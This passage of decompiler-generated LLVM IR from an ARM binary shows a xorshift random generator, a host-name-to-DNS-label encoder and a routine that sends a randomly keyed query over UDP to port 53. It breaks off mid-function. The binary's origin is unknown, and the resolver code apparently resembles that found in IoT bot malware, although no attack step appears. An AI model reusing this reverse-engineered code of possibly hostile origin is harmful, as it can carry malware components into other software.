  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_119b8 = load i32, i32* @r4, align 4
  store i32 %v3_119b8, i32* %stack_var_-36, align 4
  %v9_119b8 = load i32, i32* @r6, align 4
  %v12_119b8 = load i32, i32* @r7, align 4
  %v15_119b8 = load i32, i32* @r8, align 4
  %v18_119b8 = load i32, i32* @sb, align 4
  %v21_119b8 = load i32, i32* @sl, align 4
  %v24_119b8 = load i32, i32* @fp, align 4
  %v0_119bc = load i32, i32* @r1, align 4
  store i32 %v0_119bc, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_119bc, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_119b8
  store i32 %v3_119b8, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_119b8
  store i32 ptrtoint (i32* @global_var_1d970.220 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d96c.224 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d968.222 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d964.218 to i32), i32* %r8.global-to-local, align 4
  %v2_119d8 = load i32, i32* @global_var_1d970.220, align 4
  store i32 %v2_119d8, i32* %lr.global-to-local, align 4
  %v2_119dc = load i32, i32* @global_var_1d96c.224, align 4
  store i32 %v2_119dc, i32* %r7.global-to-local, align 4
  %v2_119e0 = load i32, i32* @global_var_1d968.222, align 4
  store i32 %v2_119e0, i32* %r6.global-to-local, align 4
  %v2_119e4 = load i32, i32* @global_var_1d964.218, align 4
  br label %dec_label_pc_11a10

dec_label_pc_119ec:                               ; preds = %dec_label_pc_11a3c
  %v3_11a44 = sdiv i32 %v5_11a28, 256
  %v1_119ec = trunc i32 %v3_11a44 to i8
  %v3_119ec = add i32 %v9_11a30, 1
  %v4_119ec = inttoptr i32 %v3_119ec to i8*
  store i8 %v1_119ec, i8* %v4_119ec, align 1
  %v0_119f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_119f0 = trunc i32 %v0_119f0 to i8
  %v2_119f0 = load i32, i32* %r5.global-to-local, align 4
  %v3_119f0 = inttoptr i32 %v2_119f0 to i8*
  store i8 %v1_119f0, i8* %v3_119f0, align 1
  %v0_119f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_119f4 = add i32 %v0_119f4, 2
  store i32 %v1_119f4, i32* %r5.global-to-local, align 4
  %v0_119f8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %.thread, %dec_label_pc_119ec
  %v0_119f8 = phi i32 [ %v9_11a34, %.thread ], [ %v0_119f8.pre, %dec_label_pc_119ec ]
  %v2_119ec7 = phi i32 [ %v12_11a30, %.thread ], [ %v1_119f4, %dec_label_pc_119ec ]
  %tmp22 = icmp slt i32 %v0_119f8, 1
  br i1 %tmp22, label %dec_label_pc_11a78, label %dec_label_pc_11a04

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119f8
  %v0_119fc = load i32, i32* %r6.global-to-local, align 4
  %v0_11a04 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11a04, i32* %r6.global-to-local, align 4
  %v0_11a08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_11a08, i32* %r7.global-to-local, align 4
  %v0_11a0c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11a0c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %bb21, %dec_label_pc_11a04
  %v0_11a60 = phi i32 [ %v2_119e0, %bb21 ], [ %v0_11a04, %dec_label_pc_11a04 ]
  %v9_11a30 = phi i32 [ %tmp, %bb21 ], [ %v2_119ec7, %dec_label_pc_11a04 ]
  %v0_11a48 = phi i32 [ %v0_119bc, %bb21 ], [ %v0_119f8, %dec_label_pc_11a04 ]
  %v0_11a54 = phi i32 [ %v2_119d8, %bb21 ], [ %v0_11a0c, %dec_label_pc_11a04 ]
  %v0_11a50 = phi i32 [ %v2_119e4, %bb21 ], [ %v0_119fc, %dec_label_pc_11a04 ]
  %v4_11a10 = mul i32 %v0_11a50, 2048
  %v5_11a10 = xor i32 %v4_11a10, %v0_11a50
  %v4_11a14 = udiv i32 %v0_11a54, 524288
  %v5_11a14 = xor i32 %v4_11a14, %v0_11a54
  %v2_11a18 = xor i32 %v5_11a14, %v5_11a10
  %v4_11a28 = udiv i32 %v5_11a10, 256
  %v5_11a28 = xor i32 %v4_11a28, %v2_11a18
  store i32 %v5_11a28, i32* %r3.global-to-local, align 4
  %v7_11a30 = icmp sgt i32 %v0_11a48, 3
  br i1 %v7_11a30, label %.thread, label %dec_label_pc_11a3c

.thread:                                          ; preds = %dec_label_pc_11a10
  %v10_11a30 = inttoptr i32 %v9_11a30 to i32*
  store i32 %v5_11a28, i32* %v10_11a30, align 4
  %v11_11a30 = load i32, i32* %r5.global-to-local, align 4
  %v12_11a30 = add i32 %v11_11a30, 4
  store i32 %v12_11a30, i32* %r5.global-to-local, align 4
  %v8_11a34 = load i32, i32* %r4.global-to-local, align 4
  %v9_11a34 = add i32 %v8_11a34, -4
  store i32 %v9_11a34, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_119f8

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a10
  store i32 %v5_11a28, i32* %r3.global-to-local, align 4
  %v7_11a40 = icmp eq i32 %v0_11a48, 1
  %v1_11a48 = add i32 %v0_11a48, -2
  store i32 %v1_11a48, i32* %r4.global-to-local, align 4
  br i1 %v7_11a40, label %dec_label_pc_11a50, label %dec_label_pc_119ec

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a3c
  store i32 %v5_11a28, i32* %r3.global-to-local, align 4
  %v1_11a60 = load i32, i32* %r8.global-to-local, align 4
  %v2_11a60 = inttoptr i32 %v1_11a60 to i32*
  store i32 %v0_11a60, i32* %v2_11a60, align 4
  %v0_11a64 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a64 = load i32, i32* %sl.global-to-local, align 4
  %v2_11a64 = inttoptr i32 %v1_11a64 to i32*
  store i32 %v0_11a64, i32* %v2_11a64, align 4
  %v0_11a68 = load i32, i32* %lr.global-to-local, align 4
  %v1_11a68 = load i32, i32* %sb.global-to-local, align 4
  %v2_11a68 = inttoptr i32 %v1_11a68 to i32*
  store i32 %v0_11a68, i32* %v2_11a68, align 4
  %v0_11a6c = load i32, i32* %r3.global-to-local, align 4
  %v1_11a6c = load i32, i32* %fp.global-to-local, align 4
  %v2_11a6c = inttoptr i32 %v1_11a6c to i32*
  store i32 %v0_11a6c, i32* %v2_11a6c, align 4
  %v0_11a70 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a70 = trunc i32 %v0_11a70 to i8
  %v2_11a70 = load i32, i32* %r5.global-to-local, align 4
  %v3_11a70 = inttoptr i32 %v2_11a70 to i8*
  store i8 %v1_11a70, i8* %v3_11a70, align 1
  %v2_11a74 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11a74, i32* @r4, align 4
  store i32 %v9_119b8, i32* @r6, align 4
  store i32 %v12_119b8, i32* @r7, align 4
  store i32 %v15_119b8, i32* @r8, align 4
  store i32 %v18_119b8, i32* @sb, align 4
  store i32 %v21_119b8, i32* @sl, align 4
  store i32 %v24_119b8, i32* @fp, align 4
  ret i32 %v5_11a10

dec_label_pc_11a78:                               ; preds = %dec_label_pc_119f8
  %v0_11a78 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a78 = load i32, i32* %fp.global-to-local, align 4
  %v2_11a78 = inttoptr i32 %v1_11a78 to i32*
  store i32 %v0_11a78, i32* %v2_11a78, align 4
  %v0_11a7c = load i32, i32* %lr.global-to-local, align 4
  %v1_11a7c = load i32, i32* %sb.global-to-local, align 4
  %v2_11a7c = inttoptr i32 %v1_11a7c to i32*
  store i32 %v0_11a7c, i32* %v2_11a7c, align 4
  %v0_11a80 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a80 = load i32, i32* %sl.global-to-local, align 4
  %v2_11a80 = inttoptr i32 %v1_11a80 to i32*
  store i32 %v0_11a80, i32* %v2_11a80, align 4
  %v0_11a84 = load i32, i32* %r6.global-to-local, align 4
  %v1_11a84 = load i32, i32* %r8.global-to-local, align 4
  %v2_11a84 = inttoptr i32 %v1_11a84 to i32*
  store i32 %v0_11a84, i32* %v2_11a84, align 4
  %v2_11a88 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11a88, i32* @r4, align 4
  store i32 %v9_119b8, i32* @r6, align 4
  store i32 %v12_119b8, i32* @r7, align 4
  store i32 %v15_119b8, i32* @r8, align 4
  store i32 %v18_119b8, i32* @sb, align 4
  store i32 %v21_119b8, i32* @sl, align 4
  store i32 %v24_119b8, i32* @fp, align 4
  ret i32 %v5_11a10

; uselistorder directives
  uselistorder i32 %v9_11a34, { 1, 0 }
  uselistorder i32 %v12_11a30, { 1, 0 }
  uselistorder i32 %v5_11a28, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_11a10, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11a50, { 1, 0 }
  uselistorder i32 %v0_11a54, { 1, 0 }
  uselistorder i32 %v0_119f8, { 1, 0 }
  uselistorder i32 %v24_119b8, { 1, 0 }
  uselistorder i32 %v21_119b8, { 1, 0 }
  uselistorder i32 %v18_119b8, { 1, 0 }
  uselistorder i32 %v15_119b8, { 1, 0 }
  uselistorder i32 %v12_119b8, { 1, 0 }
  uselistorder i32 %v9_119b8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1d964.218, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1d968.222, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1d96c.224, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1d970.220, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_11a10, { 1, 0 }
}

define i32 @function_11a9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11a9c = load i32, i32* @r4, align 4
  store i32 %v3_11a9c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_11aa0 = icmp eq i32 %arg1, 0
  br i1 %v2_11aa0, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_11a9c
  store i32 %v3_11a9c, i32* @r4, align 4
  ret i32 0

bb3:                                              ; preds = %dec_label_pc_11a9c
  %v1_11aa8 = add i32 %arg1, 4
  %v2_11aa8 = inttoptr i32 %v1_11aa8 to i32*
  %v3_11aa8 = load i32, i32* %v2_11aa8, align 4
  %v1_11ab0 = icmp ne i32 %v3_11aa8, 0
  call void @__pseudo_cond_branch(i1 %v1_11ab0, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  %v0_11ab4 = load i32, i32* %r4.global-to-local, align 4
  %v2_11ab8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11ab8, i32* @r4, align 4
  %v1_11abc = call i32 @_free(i32 %v0_11ab4)
  ret i32 %v1_11abc
}

define i32 @function_11ac0(i8* %arg1) local_unnamed_addr {
dec_label_pc_11ac0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2240 = alloca i8, align 1
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11ac0 = load i32, i32* @r4, align 4
  store i32 %v3_11ac0, i32* %stack_var_-36, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_11ad8 = call i32 @_calloc(i32 1, i32 8)
  %v0_11ae0 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ae0 = inttoptr i32 %v0_11ae0 to i8*
  store i32 %v0_11ae0, i32* %r0.global-to-local, align 4
  %v3_11ae4 = call i32 @function_1460c(i8* %v1_11ae0)
  %v2_11aec = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_11aec, i32* %fp.global-to-local, align 4
  %v2_11af0 = ptrtoint i8* %stack_var_-2240 to i32
  %v1_11af4 = add i32 %v3_11ae4, 1
  store i32 %v1_11af4, i32* %r0.global-to-local, align 4
  %v2_11af8 = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_11af8, i32* %r2.global-to-local, align 4
  store i32 %v2_11aec, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_11b38162 = icmp eq i32 %v1_11af4, 0
  store i1 %v2_11b38162, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_11b40163 = or i32 %v2_11af8, 1
  store i32 %v1_11b40163, i32* %r1.global-to-local, align 4
  %tmp124164 = icmp slt i32 %v1_11af4, 1
  br i1 %tmp124164, label %dec_label_pc_11b48, label %dec_label_pc_11b08.lr.ph

dec_label_pc_11b08.lr.ph:                         ; preds = %dec_label_pc_11ac0
  %v0_11b08.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b08

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11b08.lr.ph, %.thread12
  %v1_11b1c176.off0 = phi i8 [ 0, %dec_label_pc_11b08.lr.ph ], [ %extract.t179, %.thread12 ]
  %v0_11b08 = phi i32 [ %v0_11b08.pre, %dec_label_pc_11b08.lr.ph ], [ %v1_11b2c, %.thread12 ]
  %v2_11b4c165 = phi i32 [ %v2_11af8, %dec_label_pc_11b08.lr.ph ], [ %v0_11b34, %.thread12 ]
  %v1_11b08 = inttoptr i32 %v0_11b08 to i8*
  %v2_11b08 = load i8, i8* %v1_11b08, align 1
  %v3_11b08 = zext i8 %v2_11b08 to i32
  store i32 %v3_11b08, i32* %r3.global-to-local, align 4
  %v2_11b0c = icmp eq i8 %v2_11b08, 0
  store i1 %v2_11b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b0c, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_11b08
  %v8_11b10 = icmp eq i8 %v2_11b08, 46
  store i1 %v8_11b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11b10, label %.thread6, label %.thread

.thread:                                          ; preds = %bb
  %v4_11b14 = inttoptr i32 %v2_11b4c165 to i8*
  store i8 %v2_11b08, i8* %v4_11b14, align 1
  %v5_11b14 = load i32, i32* %r2.global-to-local, align 4
  %v6_11b14 = add i32 %v5_11b14, 1
  store i32 %v6_11b14, i32* %r2.global-to-local, align 4
  %v0_11b18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11b18.pr.pr, label %.thread..thread6_crit_edge, label %bb122

.thread..thread6_crit_edge:                       ; preds = %.thread
  %v1_11b1c.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_11b1c.pre to i8
  br label %.thread6

.thread6:                                         ; preds = %.thread..thread6_crit_edge, %bb, %dec_label_pc_11b08
  %v1_11b1c.off0 = phi i8 [ %extract.t, %.thread..thread6_crit_edge ], [ %v1_11b1c176.off0, %bb ], [ %v1_11b1c176.off0, %dec_label_pc_11b08 ]
  %v3_11b1c = load i32, i32* %r5.global-to-local, align 4
  %v4_11b1c = inttoptr i32 %v3_11b1c to i8*
  store i8 %v1_11b1c.off0, i8* %v4_11b1c, align 1
  %v0_11b20.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11b20.pr, label %bb123, label %..thread12_crit_edge

bb122:                                            ; preds = %.thread
  store i32 %v6_11b14, i32* %r1.global-to-local, align 4
  %v1_11b20 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b20 = urem i32 %v1_11b20, 256
  store i32 %v2_11b20, i32* %lr.global-to-local, align 4
  br label %.thread12

..thread12_crit_edge:                             ; preds = %.thread6
  %v1_11b2010 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b2011 = urem i32 %v1_11b2010, 256
  store i32 %v2_11b2011, i32* %lr.global-to-local, align 4
  br label %.thread12

bb123:                                            ; preds = %.thread6
  %v1_11b24.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_11b24.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb122, %..thread12_crit_edge, %bb123
  %v0_11b3c.pre = phi i32 [ %v2_11b2011, %..thread12_crit_edge ], [ %v2_11b20, %bb122 ], [ 0, %bb123 ]
  %v0_11b2c = load i32, i32* %r4.global-to-local, align 4
  %v1_11b2c = add i32 %v0_11b2c, 1
  store i32 %v1_11b2c, i32* %r4.global-to-local, align 4
  %v0_11b30 = load i32, i32* %r0.global-to-local, align 4
  %v1_11b30 = add i32 %v0_11b30, -1
  store i32 %v1_11b30, i32* %r0.global-to-local, align 4
  %v0_11b34 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11b34, i32* %r2.global-to-local, align 4
  %v2_11b38 = icmp eq i32 %v1_11b30, 0
  store i1 %v2_11b38, i1* %cpsr_z.global-to-local, align 1
  %v1_11b3c = add nuw nsw i32 %v0_11b3c.pre, 1
  store i32 %v1_11b3c, i32* %ip.global-to-local, align 4
  %v1_11b40 = add i32 %v0_11b34, 1
  store i32 %v1_11b40, i32* %r1.global-to-local, align 4
  %tmp124 = icmp slt i32 %v1_11b30, 1
  %extract.t179 = trunc i32 %v0_11b3c.pre to i8
  br i1 %tmp124, label %dec_label_pc_11b48, label %dec_label_pc_11b08

dec_label_pc_11b48:                               ; preds = %.thread12, %dec_label_pc_11ac0
  %v2_11b4c.lcssa = phi i32 [ %v2_11af8, %dec_label_pc_11ac0 ], [ %v0_11b34, %.thread12 ]
  %v3_11ad8 = inttoptr i32 %v2_11ad8 to i8*
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_11b4c = inttoptr i32 %v2_11b4c.lcssa to i8*
  store i8 0, i8* %v3_11b4c, align 1
  store i32 %v2_11aec, i32* %r0.global-to-local, align 4
  %v1_11b54 = bitcast i32* %stack_var_-2228 to i8*
  %v2_11b54 = call i32 @function_1460c(i8* %v1_11b54)
  %v2_11b58 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_11b58, i32* %r1.global-to-local, align 4
  %v0_11b5c = load i32, i32* %fp.global-to-local, align 4
  %v2_11b5c = add i32 %v0_11b5c, %v2_11b54
  store i32 %v2_11b5c, i32* %r5.global-to-local, align 4
  %v0_11b60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11b60, i32* %stack_var_-64, align 4
  store i32 %v2_11aec, i32* %r0.global-to-local, align 4
  %v2_11b74 = call i32 @function_1460c(i8* %v1_11b54)
  %v1_11b78 = add i32 %v2_11b74, 17
  store i32 %v1_11b78, i32* %r0.global-to-local, align 4
  %v0_11b80 = call i32 @function_117dc()
  %v2_11b8c = urem i32 %v0_11b80, 65535
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %v2_11b8c, i32* %r3.global-to-local, align 4
  %v2_11ba0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_11ba0, i32* %r0.global-to-local, align 4
  %v2_11ba8 = call i32 @function_146ac(i32 %v2_11ba0, i32 16)
  %sext = mul i32 %v2_11b8c, 16777216
  %v4_11bac = sdiv i32 %sext, 16777216
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %v2_11b58, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v4_11bac, i32* %lr.global-to-local, align 4
  %v0_11bf4 = load i32, i32* %r5.global-to-local, align 4
  %v2_11bf4 = add i32 %v0_11bf4, 1
  store i32 %v2_11bf4, i32* %ip.global-to-local, align 4
  %v2_11bf8 = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  %v5_11bfc = trunc i32 %v4_11bac to i8
  store i8 %v5_11bfc, i8* %stack_var_-2240, align 1
  %v0_11c14 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c14 = trunc i32 %v0_11c14 to i8
  %v4_11c14 = inttoptr i32 %v2_11bf4 to i8*
  store i8 %v1_11c14, i8* %v4_11c14, align 1
  %v0_11c18 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c18 = trunc i32 %v0_11c18 to i8
  %v2_11c18 = load i32, i32* %ip.global-to-local, align 4
  %v3_11c18 = add i32 %v2_11c18, 2
  %v4_11c18 = inttoptr i32 %v3_11c18 to i8*
  store i8 %v1_11c18, i8* %v4_11c18, align 1
  %v0_11c1c = load i32, i32* %r0.global-to-local, align 4
  %v1_11c1c = trunc i32 %v0_11c1c to i8
  %v2_11c1c = load i32, i32* %ip.global-to-local, align 4
  %v3_11c1c = add i32 %v2_11c1c, 3
  %v4_11c1c = inttoptr i32 %v3_11c1c to i8*
  store i8 %v1_11c1c, i8* %v4_11c1c, align 1
  %v0_11c20 = load i32, i32* %r0.global-to-local, align 4
  %v1_11c20 = trunc i32 %v0_11c20 to i8
  %v2_11c20 = load i32, i32* %ip.global-to-local, align 4
  %v3_11c20 = add i32 %v2_11c20, 1
  %v4_11c20 = inttoptr i32 %v3_11c20 to i8*
  store i8 %v1_11c20, i8* %v4_11c20, align 1
  %v0_11c28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11c28, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11c30 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_11c30, i32* %r6.global-to-local, align 4
  %v2_11cd4 = ptrtoint i32* %stack_var_-36 to i32
  %v2_11d00 = ptrtoint i32* %stack_var_-48 to i32
  %v1_11dd8 = add i32 %v2_11bf8, 12
  %v1_11de0 = inttoptr i32 %v1_11dd8 to i8*
  %v1_11df4 = add i32 %v2_11bf8, 1
  %v2_11df4 = inttoptr i32 %v1_11df4 to i8*
  %v1_11e10 = add i32 %v2_11bf8, 6
  %v2_11e10 = inttoptr i32 %v1_11e10 to i8*
  %v1_11e14 = add i32 %v2_11bf8, 7
  %v2_11e14 = inttoptr i32 %v1_11e14 to i8*
  br label %dec_label_pc_11c34

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11d88, %dec_label_pc_11b48
  %v1_11c38 = phi i32 [ %v0_11c34.pre, %dec_label_pc_11d88 ], [ -1, %dec_label_pc_11b48 ]
  %v7_11c34 = icmp eq i32 %v1_11c38, -1
  store i1 %v7_11c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c34, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_11c34
  store i32 %v1_11c38, i32* %r0.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_11c34, %bb125
  store i32 72768, i32* %lr.global-to-local, align 4
  %v1_11c3c = xor i1 %v7_11c34, true
  call void @__pseudo_cond_branch(i1 %v1_11c3c, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11c4c = call i32 @_socket(i32 2, i32 2, i32 0)
  store i32 %v3_11c4c, i32* %r0.global-to-local, align 4
  %v7_11c50 = icmp eq i32 %v3_11c4c, -1
  store i1 %v7_11c50, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_11c4c, i32* %r7.global-to-local, align 4
  br i1 %v7_11c50, label %dec_label_pc_11dc8, label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %bb126
  store i32 %v2_11ba0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11c68 = call i32 @_connect(i32 %v3_11c4c, i32 %v2_11ba0, i32 16)
  store i32 %v3_11c68, i32* %r0.global-to-local, align 4
  %v7_11c6c = icmp eq i32 %v3_11c68, -1
  store i1 %v7_11c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c6c, label %dec_label_pc_11d90, label %dec_label_pc_11c74

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11c5c
  %v0_11c74 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11c74, i32* %r0.global-to-local, align 4
  store i32 %v2_11af0, i32* %r1.global-to-local, align 4
  store i32 %v1_11b78, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11c84 = call i32 @_send(i32 %v0_11c74, i32 %v2_11af0, i32 %v1_11b78, i32 16384)
  store i32 %v4_11c84, i32* %r0.global-to-local, align 4
  %v7_11c88 = icmp eq i32 %v4_11c84, -1
  store i1 %v7_11c88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c88, label %dec_label_pc_11d90, label %dec_label_pc_11c90

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11c74
  %v0_11c90 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11c90, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_11c9c = call i32 @_fcntl(i32 3, i32 %v0_11c90, i32 0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_11ca4 = or i32 %v3_11c9c, 2048
  store i32 %v1_11ca4, i32* %r2.global-to-local, align 4
  %v0_11ca8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ca8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_11cb0 = call i32 @_fcntl(i32 4, i32 %v0_11ca8, i32 %v1_11ca4)
  store i32 %v3_11cb0, i32* %r0.global-to-local, align 4
  %v0_11cb4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11cb4, i32* %r3.global-to-local, align 4
  %v2_11cb8154 = load i32, i32* %r6.global-to-local, align 4
  %v3_11cb8155 = add i32 %v2_11cb8154, %v0_11cb4
  %v4_11cb8156 = inttoptr i32 %v3_11cb8155 to i32*
  store i32 %v0_11cb4, i32* %v4_11cb8156, align 4
  %v0_11cbc157 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cbc158 = add i32 %v0_11cbc157, 4
  store i32 %v1_11cbc158, i32* %r3.global-to-local, align 4
  %v7_11cc0159 = icmp eq i32 %v1_11cbc158, 128
  br i1 %v7_11cc0159, label %dec_label_pc_11cc8, label %dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge

dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge:  ; preds = %dec_label_pc_11c90, %dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge
  %v1_11cbc160 = phi i32 [ %v1_11cbc, %dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge ], [ %v1_11cbc158, %dec_label_pc_11c90 ]
  %v0_11cb8.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_11cb8 = load i32, i32* %r6.global-to-local, align 4
  %v3_11cb8 = add i32 %v2_11cb8, %v1_11cbc160
  %v4_11cb8 = inttoptr i32 %v3_11cb8 to i32*
  store i32 %v0_11cb8.pre, i32* %v4_11cb8, align 4
  %v0_11cbc = load i32, i32* %r3.global-to-local, align 4
  %v1_11cbc = add i32 %v0_11cbc, 4
  store i32 %v1_11cbc, i32* %r3.global-to-local, align 4
  %v7_11cc0 = icmp eq i32 %v1_11cbc, 128
  br i1 %v7_11cc0, label %dec_label_pc_11cc8, label %dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge, %dec_label_pc_11c90
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_11cc8 = load i32, i32* %r7.global-to-local, align 4
  %v3_11cc8 = udiv i32 %v0_11cc8, 32
  %v3_11cd0 = mul nuw nsw i32 %v3_11cc8, 4
  store i32 %v3_11cd0, i32* %r3.global-to-local, align 4
  store i32 %v2_11cd4, i32* %r2.global-to-local, align 4
  %v2_11cd8 = add i32 %v3_11cd0, %v2_11cd4
  store i32 %v2_11cd8, i32* %r5.global-to-local, align 4
  %v1_11cdc = add i32 %v2_11cd8, -156
  %v2_11cdc = inttoptr i32 %v1_11cdc to i32*
